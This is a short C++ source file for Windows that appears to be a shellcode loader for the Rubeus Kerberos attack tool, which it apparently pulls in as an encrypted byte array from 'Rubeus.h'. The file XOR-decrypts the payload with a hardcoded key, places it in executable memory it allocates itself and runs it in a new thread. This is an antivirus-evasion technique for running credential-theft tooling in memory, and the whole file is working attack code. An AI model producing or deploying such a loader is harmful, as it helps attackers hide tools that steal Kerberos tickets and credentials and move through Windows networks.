#include <Windows.h>
#include "Rubeus.h"

void Ahs(PBYTE src, PBYTE dst, int size)
{
	char k[] = "37slahxl;x";
	for (int i = 0; i < size; i++)
	{
		dst[i] = src[i] ^ k[i % sizeof(k)];
	}
}

int main()
{
	BYTE* shellBuff = new BYTE[sizeof(rawData)];
	Ahs(rawData, shellBuff, sizeof(rawData));

	LPVOID shellBuff2 = VirtualAlloc(0, sizeof(rawData), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (shellBuff2 == NULL)
	{
		return 1;
	}

	RtlCopyMemory(shellBuff2, shellBuff, sizeof(rawData));
	HANDLE thrd = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellBuff2, NULL, 0, NULL);
	if (thrd == NULL)
	{
		return 1;
	}
	
	WaitForSingleObject(thrd, INFINITE);

	return 0;
}